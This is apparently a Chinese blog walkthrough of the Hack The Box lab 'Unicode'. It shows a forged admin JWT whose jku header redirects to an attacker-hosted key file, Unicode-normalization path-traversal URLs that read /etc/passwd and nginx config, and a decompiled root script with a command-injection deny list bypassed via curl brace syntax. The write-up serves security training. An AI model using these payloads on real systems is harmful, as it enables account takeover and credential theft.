---
title: Unicode
date: 2022-02-06 21:12:59
tags: Hack The box
categories: 本地文件读取
---

## 信息收集

```bash
ports=$(nmap -p- --min-rate=1000 -T4 $1 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -sC -sV -oN result -p$ports $1
```
发现目标主机开放了ssh和web服务
![在这里插入图片描述](https://img-blog.csdnimg.cn/94531f843e904009983662305cf416f7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们先访问一下web服务，发现是一个注册登录的页面，我们先注册一个用户登录看看页面都实现了哪些功能
![在这里插入图片描述](https://img-blog.csdnimg.cn/58b0c8b7d4da4868b8c55e31cf82b006.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)

<!--more-->

登录成功后，发现存在一个文件上传页面，但是经过多次尝试，可以上传成功，可是并不能获取到上传的路径
![在这里插入图片描述](https://img-blog.csdnimg.cn/2d61973f094d405389ede27aedcc29ba.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_19,color_FFFFFF,t_70,g_se,x_16)

<!--more-->

当我打开查看网页cookie的时候，发现是JWT形式存储
![在这里插入图片描述](https://img-blog.csdnimg.cn/2e84937520c94758b02237094c1d8d3b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_14,color_FFFFFF,t_70,g_se,x_16)
我们解密JWT后发现存在一个url路径，我们将其添加到hosts文件后进行访问并将jwks.json值保存下来
![在这里插入图片描述](https://img-blog.csdnimg.cn/66a49f96c74949d6a7124ee8f4f46431.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
![在这里插入图片描述](https://img-blog.csdnimg.cn/1a8a683ed66c4c01ba30fbcf25dcd74e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)

## 漏洞利用
这个漏洞利用过程就比较复杂了，也比较考验渗透测试者的经验和脑洞。首先我们先在[https://mkjwk.org/](https://mkjwk.org/)这个网站上生成一个用于反弹到本机上的json值，我们将生成的n值对应的值替换掉原来保存的jwks.json的值

![在这里插入图片描述](https://img-blog.csdnimg.cn/2395e952d4c2421c90faec928391bfa5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
![在这里插入图片描述](https://img-blog.csdnimg.cn/7b089027eba64eba8226cb130c062b6d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
![在这里插入图片描述](https://img-blog.csdnimg.cn/5f4cf42fd9c54d4fabc001825bb29e5f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
然后我们利用url重定向，先在本地开放一个微型的服务器，然后将用户变换为admin，生成一个新的JWT值用户登录admin用户界面，最后将新生成的公钥私钥值复制到生成页面上。
![在这里插入图片描述](https://img-blog.csdnimg.cn/7dd0979b020f42769ff74f57dd9f6d3b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
![在这里插入图片描述](https://img-blog.csdnimg.cn/f350f5bcd6314ccab112859ec77a8b67.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_17,color_FFFFFF,t_70,g_se,x_16)

![在这里插入图片描述](https://img-blog.csdnimg.cn/c18abc73505a467c8871475cfb0c06df.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_17,color_FFFFFF,t_70,g_se,x_16)
生成一个新的JWT值，替换掉用普通用户登录的JWT值，刷新页面

```bash
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdD91cmw9MTAuMTAuMTQuMjMvandrcy5qc29uIn0.eyJ1c2VyIjoiYWRtaW4ifQ.XdbEyn8OmY2soOmA_LCwfwPyW_CgWyMD0TyeVDQZ0KlVTLHTaiuhui961b8qXqc_Kbxu20Zt6FYaZV_JS9dP_RT19ecIdFMZaEkRup-y07r1KBoHMWiGTyg-Q9uc1auj3XMqjHSp6rT7eTEsVFv-qzjQEVPaRJfqYLoE6Hxt2aW2bvG1I3PoEm9oVnH3zXm_ngM46AC_4Iy3ZMXduufwEeJY8OLkQPlZgQ0s3tuQjDZqRjFMlYBz0sGkgw_Oud-40hvrylaQmJdmsulrbED9BLiuhCvbFrX_Q-tXlxkxHWc5Q52co1qf6A0P-2N_zeRjhw0M1RB3T7G2GvTKZGFJzQ
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/f798ff356a704ad5978651ab61558088.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
点击current month页面是，发现是一个本地文件读取漏洞，并且一般的读取姿势还不能读取成功
![在这里插入图片描述](https://img-blog.csdnimg.cn/2a90ae4d3b0f4fabb4568a2c7e9543b3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们尝试使用`U+FE30`的编码形式进行绕过，经过反复尝试成功读取到`/etc/passwd`文件的内容，这是有关文件读取编码绕过的具体内容[https://link.zhihu.com/?target=https%3A//lazarv.com/posts/unicode-normalization-vulnerabilities/](https://link.zhihu.com/?target=https://lazarv.com/posts/unicode-normalization-vulnerabilities/)

```bash
http://10.10.11.126/display/?page=%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/etc/passwd
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/37a1d401639748fa8d5f7d6a6d032e60.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们进行信息收集时发现，目标主机上运行着nginx服务器，我们可以尝试读取nginx相关的用户配置信息。读取到的路径是`/home/code/coder`，并且存在密码信息文件`db.yaml`

```bash
http://10.10.11.126/display/?page=%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/etc/nginx/sites-available/default
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/d0b8d96c2fff4e1591dcb2463dd98829.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
成功读取到code用户信息和相关密码信息内容
![在这里插入图片描述](https://img-blog.csdnimg.cn/c7333db6968b416cacbab568dcebd320.png)
从收集的信息上看，code用户是可以使用ssh连接bash终端的
![在这里插入图片描述](https://img-blog.csdnimg.cn/5909c1cd13dc4df6a51189f4a7ea807f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
![在这里插入图片描述](https://img-blog.csdnimg.cn/02f18e5957bc45f5911b267d955b6828.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
## 提权到ROOT
发现可以以root身份运行treport程序，我们可以尝试运行分析其功能
![在这里插入图片描述](https://img-blog.csdnimg.cn/0ccb282c259d4e9ea27ec430d04b4b95.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
发现是对分析报告的生成，并且文件的类型是python，在第三个选择上调用了curl命令进行报告下载
![在这里插入图片描述](https://img-blog.csdnimg.cn/f6e677204f80458db27023145b872e38.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
突破点就是在第三个选项上，但是我们不知道他具体程序的源码是怎么实现的，所以需要对这个python文件进行逆向源码还原。这里使用到的工具有`pyinstxtractor`和`pycdc`，并且将treport文件通过scp的形式下载下来
![在这里插入图片描述](https://img-blog.csdnimg.cn/f414b554fcc14d4c9351cf7763f734ba.png)
脚本运行成功后会产生一个新的文件夹
![在这里插入图片描述](https://img-blog.csdnimg.cn/9ed3cfb08b8e4fd092e3fcbc27ebfe60.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
文件夹内大部分文件都是pyc文件格式
![在这里插入图片描述](https://img-blog.csdnimg.cn/121f6a8d3c3849f7af0cee4353e1848e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
那么我们就要用到c和c++的转换工具了
![在这里插入图片描述](https://img-blog.csdnimg.cn/e895ce0488c147ffb5fd266f9be93cc5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
![在这里插入图片描述](https://img-blog.csdnimg.cn/a41b4ae29bb949d99332f17c8c92b5b7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
通过审计源代码可以得知，在下载文件部分使用了黑名单进行过滤，但是唯独没有过滤大括号，因此我们可以使用大括号进行文件读取，我们可以使用curl的--config参数对指定文件内容进行读取

```bash
./pycdc ../treport_extracted/treport.pyc
```

```python
# Source Generated with Decompyle++
# File: treport.pyc (Python 3.9)

Unsupported opcode: <255>
import os
import sys
from datetime import datetime
import re

class threat_report:
    
    def create(self):
Unsupported opcode: <255>
        file_name = input('Enter the filename:')
        content = input('Enter the report:')
        if '../' in file_name:
            print('NOT ALLOWED')
            sys.exit(0)
        file_path = '/root/reports/' + file_name
    # WARNING: Decompyle incomplete

    
    def list_files(self):
        file_list = os.listdir('/root/reports/')
        files_in_dir = ' '.join((lambda .0: [ str(elem) for elem in .0 ])(file_list))
        print('ALL THE THREAT REPORTS:')
        print(files_in_dir)

    
    def read_file(self):
Unsupported opcode: <255>
        file_name = input('\nEnter the filename:')
        if '../' in file_name:
            print('NOT ALLOWED')
            sys.exit(0)
        contents = ''
        file_name = '/root/reports/' + file_name
    # WARNING: Decompyle incomplete

    
    def download(self):
        now = datetime.now()
        current_time = now.strftime('%H_%M_%S')
        command_injection_list = [
            '$',
            '`',
            ';',
            '&',
            '|',
            '||',
            '>',
            '<',
            '?',
            "'",
            '@',
            '#',
            '$',
            '%',
            '^',
            '(',
            ')']
        ip = input('Enter the IP/file_name:')
        res = bool(re.search('\\s', ip))
        if res:
            print('INVALID IP')
            sys.exit(0)
        if 'file' in ip and 'gopher' in ip or 'mysql' in ip:
            print('INVALID URL')
            sys.exit(0)
        cmd = '/bin/bash -c "curl ' + ip + ' -o /root/reports/threat_report_' + current_time + '"'
        os.system(cmd)


# WARNING: Decompyle incomplete
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/e74f33ca978844968ee75dd4938f38b9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
